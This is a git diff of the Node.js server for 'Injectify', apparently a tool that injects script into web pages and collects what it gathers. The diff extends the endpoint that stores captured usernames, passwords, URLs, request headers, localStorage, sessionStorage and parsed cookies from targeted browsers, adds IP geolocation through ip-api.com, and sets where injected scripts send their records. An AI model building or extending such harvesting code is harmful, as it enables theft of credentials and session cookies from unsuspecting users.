@@ -42,31 +42,30 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		var getToken = code => {
 			return new Promise((resolve, reject) => {
 				request({
-						url: 'https://github.com/login/oauth/access_token',
-						method: 'POST',
-						headers: {
-							'Accept': 'application/json'
-						},
-						qs: {
-							'client_id': config.github.client_id,
-							'client_secret': config.github.client_secret,
-							'code': code
-						}
-					}, (error, response, github) => {
-						try {
-							github = JSON.parse(github)
-						} catch(e) {
-							console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
-							console.error(e)
-							reject(Error("Failed to parse GitHub response"))
-						}
-						if (!error && response.statusCode == 200 && github.access_token) {
-							resolve(github.access_token)
-						} else {
-							reject(Error("Failed to authenticate account, invalid code"))
-						}
+					url: 'https://github.com/login/oauth/access_token',
+					method: 'POST',
+					headers: {
+						'Accept': 'application/json'
+					},
+					qs: {
+						'client_id': config.github.client_id,
+						'client_secret': config.github.client_secret,
+						'code': code
 					}
-				)
+				}, (error, response, github) => {
+					try {
+						github = JSON.parse(github)
+					} catch(e) {
+						console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
+						console.error(e)
+						reject(Error("Failed to parse GitHub response"))
+					}
+					if (!error && response.statusCode == 200 && github.access_token) {
+						resolve(github.access_token)
+					} else {
+						reject(Error("Failed to authenticate account, invalid code"))
+					}
+				})
 			})
 		}
 		var getUser = token => {
@@ -115,9 +114,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				db.collection('users', (err, users) => {
 					if (err) throw err
 					users.findOne({id: user.id}).then(doc => {
+						let ipAddress = getIP(socket.handshake.address)
+						if(socket.handshake.headers['x-forwarded-for']) ipAddress = getIP(socket.handshake.headers['x-forwarded-for'].split(',')[0])
 						if(doc !== null) {
 							// User exists in database
-							console.log(socket)
 							users.updateOne({
 								id: user.id
 							},
@@ -129,7 +129,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								$push: {
 									logins: {
 										time		: Math.round(new Date().getTime() / 1000),
-										ip			: getIP(socket.handshake.address),
+										ip			: ipAddress,
 										token		: token,
 										login_type	: loginMethod
 									}
@@ -148,7 +148,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								},
 								logins		: [{
 									time		: Math.round(new Date().getTime() / 1000),
-									ip			: getIP(socket.handshake.address),
+									ip			: ipAddress,
 									token		: token,
 									login_type	: loginMethod
 								}],
@@ -524,46 +524,59 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								} catch(e) {
 									var ip = getIP(req.connection.remoteAddress)
 								}
-								try {
-									if(record[cookies]) {
-										var pairs = record[cookies].split(";")
-										var c = {}
-										for (var i=0; i<pairs.length; i++){
-											var pair = pairs[i].split("=")
-											c[pair[0]] = unescape(pair[1])
+								request({
+									url: 'http://ip-api.com/json/' + ip,
+									method: 'GET',
+									headers: {
+										'Accept': 'application/json'
+									}
+								}, (error, response, parsedIP) => {
+									try {
+										ip = JSON.parse(parsedIP)
+									} catch(e) {
+
+									}
+									try {
+										if(record[cookies]) {
+											var pairs = record[cookies].split(";")
+											var c = {}
+											for (var i=0; i<pairs.length; i++){
+												var pair = pairs[i].split("=")
+												c[pair[0]] = unescape(pair[1])
+											}
+										} else {
+											var c = record[cookies]
 										}
-									} else {
+									} catch(e) {
+										//throw(e)
 										var c = record[cookies]
 									}
-								} catch(e) {
-									//throw(e)
-									var c = record[cookies]
-								}
-								projects.updateOne({
-									name: record[project]
-								},
-								{
-									$push: {
-										records: {
-											timestamp	: Math.round(new Date().getTime() / 1000),
-											username	: record[username],
-											password	: record[password],
-											url			: record[url],
-											ip			: ip,
-											browser: {
-												width	: record[width],
-												height	: record[height],
-												headers	: req.headers
-											},
-											storage : {
-												local	: record[localStorage],
-												session	: record[sessionStorage],
-												cookies	: c
+									projects.updateOne({
+										name: record[project]
+									},
+									{
+										$push: {
+											records: {
+												timestamp	: Math.round(new Date().getTime() / 1000),
+												username	: record[username],
+												password	: record[password],
+												url			: record[url],
+												ip			: ip,
+												browser: {
+													width	: record[width],
+													height	: record[height],
+													headers	: req.headers
+												},
+												storage : {
+													local	: record[localStorage],
+													session	: record[sessionStorage],
+													cookies	: c
+												}
 											}
 										}
-									}
-								}).then(() => {
-									resolve("wrote record to database")
+									}).then(() => {
+										resolve("wrote record to database")
+									})
 								})
 							} else {
 								reject("project " + record[project] + " doesn't exist")
@@ -665,9 +678,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 
 		if (project && token) {
 			getAPI(project, token).then(json => {
+				res.setHeader('Content-Disposition', 'filename="Injectify project records [' + json.name + '].json"')
 				if (req.path.toLowerCase().endsWith("&download=true")) {
 					res.setHeader('Content-Type', 'application/octet-stream')
-					res.setHeader('Content-Disposition', 'filename="injectify_project_[' + json.name + '].json"')
 				} else {
 					res.setHeader('Content-Type', 'application/json')
 				}
@@ -723,6 +736,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		if (req.query.cookies == "false") cookies = false
 		
 		let proxy			= "//injectify.samdd.me/record/"
+		if (config.dev) proxy = "http://localhost:" + config.express + "/record/"
 		if (req.query.proxy) proxy = req.query.proxy
 		if (valid) {
 			res.setHeader('Content-Type', 'application/javascript')
